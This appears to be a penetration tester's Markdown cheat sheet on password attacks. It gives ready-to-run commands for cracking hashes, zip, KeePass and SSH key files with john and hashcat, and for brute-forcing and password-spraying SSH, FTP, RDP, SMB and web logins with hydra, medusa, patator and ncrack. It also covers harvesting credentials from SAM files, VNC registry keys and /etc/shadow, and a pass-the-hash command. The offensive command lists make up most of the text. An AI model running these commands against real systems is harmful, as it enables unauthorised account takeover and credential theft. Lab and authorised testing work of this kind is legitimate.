## Quick Reference

- Finding Passwords
    ```
    grep -rl hash
    grep -rl password
    ```
- Mutate wordlists
    ```
    /etc/john/john.conf
    > $[0-9]$[0-9]
    ```
    ```
    john --wordlist=out.txt --rules --stdout > mutated.txt
    ```
- Password Cracking
    ```
    john hashes.txt
    ```
- Htaccess
    ```
    medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20
    ```
- FTP
    ```
    hydra  -l admin -P pass.txt -v ip ftp
    ```
- HTTP Post
    ```
    hydra -l none -P rockyou.txt 10.10.10.43 http-post-form
    "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
    ```
- SSH
    ```
    hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4
    ```
- Basic Auth
    ```
    cewl example.com -m 6 -w /root/mega-cewl.txt 2> /dev/null
    john --wordlist=mega-cewl.txt --rules --studout > mega-cewl-mutated.txt
    medusa -h admin.example.com -u admin -P mega-cewl-mutated.txt -M http -n 81 -m DIR:/admin -T 30
    ```
- Salted Hash Cracking
  - oclHashcat - input file should be in format: `passwordhash:salt`
    ```
    oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force
    ```
- RSA Private Key Password Recovery
    ```
    ssh2john id_rsa > id_john
    john id_john --wordlist=<PATH TO ROCKYOU.TXT>
    ```
- KeePass Password Recovery
    ```
    keepass2john jeeves.kdbx > jeeves.hash
    john jeeves.hash
    ```
- VNC
    ```
    reg query HKLM\SOFTWARE\RealVNC\vncserver
    Value: Password

    reg query HKCU\Software\TightVNC\Server
    Value: Password or PasswordViewOnly

    reg query HKLU\Software\TigerVNC\WinVNC4
    reg query HKLM\Software\TigerVNC\WinVNC4
    Value: Password

    C:\Program Files\UltraVNC\ultravnc.ini
    Value: passwd or passwd2
    ```
- Linux Hash
    ````
    unshadow passwd.txt shadow.txt > hashes.txt
    john —wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ````
- Cisco hashes
    ```
    python3 cisco_pwdecrypt.py -u "\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91" -d /usr/share/wordlists/rockyou.txt
    ```
- Decrypt gpg files:
    ```
    gpg —batch —passphrase whateverThePasswordIs-d theGPGfile
    ```
- WordPress:
    ```
    $P$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1
    hashcat —force -m 400 hash.txt /usr/share/wordlists/rockyou.txt
    ```
- SSH key bruteforce
    - grep -lr against: <https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys>
- Zip files
    ```
    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file_name>
    zip2john file.zip > file.zip.hash
    john -w:/usr/share/wordlists/rockyou.txt file.zip.hash
    ```
- SSH2john
    ```
    /usr/share/john/ssh2john.py id_rsa > ssh.hash
    john -w:/usr/share/wordlists/rockyou.txt ssh.hash
    ```
- Narrow down into a custom wordlist:
    ```
    grep -i hentai /usr/share/wordlists/rockyou.txt > pass.lst
    grep -i pokemon /usr/share/wordlists/rockyou.txt >> pass.lst
    grep -i monkey /usr/share/wordlists/rockyou.txt >> pass.lst
    grep -i startrek /usr/share/wordlists/rockyou.txt >> pass.lst
    ```

### /etc/passwd

- [Understanding /etc/passwd File Format](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
- [Linux Password & Shadow File Formats](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)
- Password Field
  - Format: `$id$salt$hashed` (`$id$$hashed` means no salt)
  - `*` account cannot be used to log in
  - `!!` user doesn't have a password
  - ` ` user doesn't have a password
  - `x` password is stored in the shadow file
  - id
    - `$1$` is MD5
    - `$2a$` is Blowfish
    - `$2y$` is Blowfish
    - `$5$` is SHA-256
    - `$6$` is SHA-512

Verify
```bash
pwck -r /etc/passwd
pwck -r /etc/shadow
```

Edit
```bash
vipw -p
vipw -s
vipw -g
```

Manually create password
```bash
openssl passwd -1 -salt xyz  yourpass
makepasswd --clearfrom=- --crypt-md5 <<< YourPass
mkpasswd  -m sha-512 -s <<< YourPass
echo -e "md5crypt\npassword" | grub | grep -o "\$1.*"
perl -e 'use Crypt::PasswdMD5; print unix_md5_crypt("Password", "Salt"),"\n"'
```

Update password
```bash
echo "username:password" | chpasswd
```
```bash
perl -e 'print crypt("YourPasswd", "salt"),"\n"'
echo "username:encryptedPassWd"  | chpasswd -e
OR
useradd -p 'encryptedPassWd'  username
```

### SAM files

- `C:\windows\system32\config\sam`
- `C:\windows\repair\sam`
- Encrypted with 128bit rivest cipher - the key to syskey utility is called "bootkey" which is stored in system file which is in `C:\windows\repair\system`
- use `samdump2`, etc. to both get the syskey from system file and use that to decrypt the hashes from uncle Sam
    ```
    samdump2 system_file sam_file
    john <outputfile.txt>
    ```

## Tools

- Word-lists
  - Wordhound - Wordlist generator that builds a list of password candidates for a specific target website: <https://bitbucket.org/mattinfosec/wordhound/src/master/>
  - Text sumarizer: <https://www.splitbrain.org/services/ots>
  - CeWL - Custom Word List Generator: <https://github.com/digininja/CeWL>
    ```
    cewl example.com -m 6 -w out.txt
    ```
  - Crunch - Wordlist generator based on criteria you specify: <https://github.com/crunchsec/crunch>
    ```
    crunch 6 6 0123456789ABCDEF -o list.txt
    crunch 8 8 -t ,@@^^%%%
    ```
    ```
    /usr/share/crunch/charset.lsr mixalpha -o  mixda.txt
    ```
  - Common password pattern generator using strings list: <https://github.com/localh0t/m4ngl3m3>
  - A script for generating custom passphrase lists to be used for password cracking with hashcat rules: <https://github.com/dafthack/PassphraseGen>
- Extraction
  - Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: <https://github.com/unode/firefox_decrypt>
  - Responder - A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication <https://github.com/SpiderLabs/Responder>
    - Pwning with Responder – A Pentester’s Guide: <https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/>
  - Windows Password Dumping
    - pwdump
    - fgdump
    - windows credential editor (WCE)
- Password Spraying
  - Spray: <https://github.com/SpiderLabs/Spray>
    ```
    SMB:  spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS
    OWA:  spray.sh -owa 192.168.0.1 users.txt passwords.txt 1 35 post-request.txt
    Lync: spray.sh -lync https://lyncdiscover.spiderlabs.com/ users.txt passwords.txt 1 35

    Note: For POST requests, replace username and password values with "sprayuser" and "spraypassword".
    ```
  - Password spraying using AWS Lambda for IP rotation: <https://github.com/ustayready/CredKing>

### Brute-forcing

- Patator <https://github.com/lanjelot/patator>
  ```
  FTP: patator ftp_login host=10.10.0.1 user=someUser password=FILE0 0=wordlist.txt
  SSH: patator ssh_login host=10.10.0.1 user=someUser password=FILE0 0=wordlist.txt
  ```
  ```
  * ftp_login      : Brute-force FTP
  * ssh_login      : Brute-force SSH
  * telnet_login   : Brute-force Telnet
  * smtp_login     : Brute-force SMTP
  * smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
  * smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
  * finger_lookup  : Enumerate valid users using Finger
  * http_fuzz      : Brute-force HTTP/HTTPS
  * rdp_gateway    : Brute-force RDP Gateway
  * ajp_fuzz       : Brute-force AJP
  * pop_login      : Brute-force POP
  * pop_passd      : Brute-force poppassd (not POP3)
  * imap_login     : Brute-force IMAP
  * ldap_login     : Brute-force LDAP
  * smb_login      : Brute-force SMB
  * smb_lookupsid  : Brute-force SMB SID-lookup
  * rlogin_login   : Brute-force rlogin
  * vmauthd_login  : Brute-force VMware Authentication Daemon
  * mssql_login    : Brute-force MSSQL
  * oracle_login   : Brute-force Oracle
  * mysql_login    : Brute-force MySQL
  * mysql_query    : Brute-force MySQL queries
  * rdp_login      : Brute-force RDP (NLA)
  * pgsql_login    : Brute-force PostgreSQL
  * vnc_login      : Brute-force VNC
  * dns_forward    : Brute-force DNS
  * dns_reverse    : Brute-force DNS (reverse lookup subnets)
  * ike_enum       : Enumerate IKE transforms
  * snmp_login     : Brute-force SNMPv1/2 and SNMPv3
  * unzip_pass     : Brute-force the password of encrypted ZIP files
  * keystore_pass  : Brute-force the password of Java keystore files
  * sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
  * umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
  ```
  ```
  patator http_fuzz url=http://example.com/index.php method=POST
  body=​ 'name=zapper&password=FILE0&autologin=1&enter=Sign+in'
  0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept_cookie=1 follow=1
  -x ignore:fgrep=​ 'Login name or password is incorrect.'
  ```
- Hydra - <https://github.com/vanhauser-thc/thc-hydra>
  ```
  SSH: hydra 10.10.10.1 -l testuser -P wordlist.txt  -t 4 ssh
  RDP: hydra -V -l testuser -P wordlist.txt rdp://10.10.10.1
  FTP: hydra 10.10.10.1 -V -l testuser -P wordlist.txt ftp
  SMB: hydra 10.10.10.1 -V -l testuser -P wordlist.txt smb
  POST form: hydra -l testuser -p wordlist.txt -e nsr 10.10.10.1 http-post-form "http://10.10.10.1/login.php:username=^USER^&ssword=^PASS^&submit=Login:<Error message>" -V
  ```
  ```
  Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,
  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY,
  HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy,
  ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP,
  Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP,
  Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3,
  SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet,
  VMware-Auth, VNC and XMPP
  ```
- Medusa - <https://github.com/jmk-foofus/medusa>
  ```
  Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  SSH: medusa -u testuser -P wordlist.txt -h <host> -M ssh
  FTP: ncrack -u testuser -P wordlist.txt -T 5 <host> -M ftp
  RDP (pass-the-hash): medusa -M rdp -m PASS:HASH -h <host> -u someuser -p <NTLM_hash>
  ```
  ```
  AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3,
  PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2,
  Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC,
  Generic Wrapper, Web Form
  ```
- ncrack - <https://github.com/nmap/ncrack>
  ```
  SSH: ncrack -u testuser -P wordlist.txt <host> -p 22
  RDP: ncrack -u testuser -P wordlist.txt <host> -p 3389
  FTP: ncrack -u testuser -P wordlist.txt <host> -p 21
  ```
  ```
  SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP,
  Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, DICOM.
  ```
- [zip] fcrackzip - <https://github.com/hyc/fcrackzip>
  ```
  fcrackzip -D -p wordlist.txt -u test.zip
  ```
  ```
  7z2john.pl backup.7z > 7z2john.out
  ```
- Steghide
  - <https://github.com/Paradoxis/StegCracker>
  - <https://github.com/Va5c0/Steghide-Brute-Force-Tool>
- 7zip
  - <https://github.com/Seyptoo/7z-BruteForce>
- OpenSSL keys
  - <https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE>

## References

## New References

- LM, NTLM, Net-NTLMv2, oh my!: <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
